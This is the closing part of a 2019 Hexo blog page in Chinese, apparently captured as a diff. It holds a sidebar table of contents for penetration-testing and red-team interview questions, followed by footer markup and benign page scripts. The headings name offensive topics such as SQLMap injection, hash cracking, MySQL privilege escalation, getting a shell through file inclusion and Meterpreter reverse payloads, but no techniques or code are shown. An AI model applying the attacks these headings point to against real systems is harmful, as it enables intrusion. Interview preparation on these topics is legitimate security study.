href="#SQLMAP中POST型注入怎么注入？"><span class="nav-text">SQLMAP中POST型注入怎么注入？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQLMAP中查询所有用户的角色？"><span class="nav-text">SQLMAP中查询所有用户的角色？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#暴力破解工具有哪些？B-S？C-S？"><span class="nav-text">暴力破解工具有哪些？B/S？C/S？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#破解Hash密码的方式？"><span class="nav-text">破解Hash密码的方式？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权"><span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#提权分类？"><span class="nav-text">提权分类？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MySQL提权分几种，不同系统有什么差异？"><span class="nav-text">MySQL提权分几种，不同系统有什么差异？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#具体场景"><span class="nav-text">具体场景</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#考虑以下场景：一个多用户的博客系统（类似于CSDN），普通用户登陆到个人中心后，发现删除自己某篇文章所请求的URI为delete-php-article-id-24，请考虑这个地方最有可能出现哪些安全问题？"><span class="nav-text">考虑以下场景：一个多用户的博客系统（类似于CSDN），普通用户登陆到个人中心后，发现删除自己某篇文章所请求的URI为delete.php?article_id=24，请考虑这个地方最有可能出现哪些安全问题？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#有文件包含，但没有上传点的站怎么GetShell？"><span class="nav-text">有文件包含，但没有上传点的站怎么GetShell？</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#红队面试题"><span class="nav-text">红队面试题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#开放式问题"><span class="nav-text">开放式问题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#技术问题"><span class="nav-text">技术问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#常规渗透"><span class="nav-text">常规渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#2-在渗透测试期间，你找到了一个运行于客户端的-Outlook-Web-Access-实例。你将如何攻击它？"><span class="nav-text">2.在渗透测试期间，你找到了一个运行于客户端的 Outlook Web Access 实例。你将如何攻击它？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-如果你在没有root权限的情况下运行以下扫描-nmap-www-google-com"><span class="nav-text">3.如果你在没有root权限的情况下运行以下扫描 nmap www.google.com</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-你正在对一个已知的、比较脆弱的主机启动-Metasploit-发出了一个-reverse-https-meterpreter-payload，但是一旦你键入“exploit”，它在启动攻击后没有任何反应，你将如何调试-或者你将更改为什么-得到你的-meterpreter-session？"><span class="nav-text">4.你正在对一个已知的、比较脆弱的主机启动 Metasploit 发出了一个 reverse https meterpreter payload，但是一旦你键入“exploit”，它在启动攻击后没有任何反应，你将如何调试(或者你将更改为什么)得到你的 meterpreter session？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#8-假设你可以对测试中的公司域上的计算机有物理访问的权限，该机器已经连接到了内网。你没有域或本地计算机的凭据，但你有自己的电脑，你会如何开始测试？"><span class="nav-text">8.假设你可以对测试中的公司域上的计算机有物理访问的权限，该机器已经连接到了内网。你没有域或本地计算机的凭据，但你有自己的电脑，你会如何开始测试？</span></a></li></ol></li></ol></li></ol></li></ol></li></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">chessur</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.1</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.1"></script>
+
+  <script src="/js/motion.js?v=7.1.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.1"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.1"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.1"></script>
+<script src="/js/post-details.js?v=7.1.1"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script>
+  $('.highlight').not('.gist .highlight').each(function(i, e) {
+    var $wrap = $('<div>').addClass('highlight-wrap');
+    $(e).after($wrap);
+    $wrap.append($('<button>').addClass('copy-btn').append('Copy').on('click', function(e) {
+      var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
+        return $(e).text();
+      }).toArray().join('\n');
+      var ta = document.createElement('textarea');
+      var yPosition = window.pageYOffset || document.documentElement.scrollTop;
+      ta.style.top = yPosition + 'px'; // Prevent page scroll
+      ta.style.position = 'absolute';
+      ta.style.opacity = '0';
+      ta.readOnly = true;
+      ta.value = code;
+      document.body.appendChild(ta);
+      ta.select();
+      ta.setSelectionRange(0, code.length);
+      ta.readOnly = false;
+      var result = document.execCommand('copy');
+      
+        if (result) $(this).text('Copied');
+        else $(this).text('Copy failed');
+      
+      ta.blur(); // For iOS
+      $(this).blur();
+    })).on('mouseleave', function(e) {
+      var $b = $(this).find('.copy-btn');
+      setTimeout(function() {
+        $b.text('Copy');
+      }, 300);
+    }).append(e);
+  })
+</script>
+
+
+  
+
+  
+
+</body>
+</html>
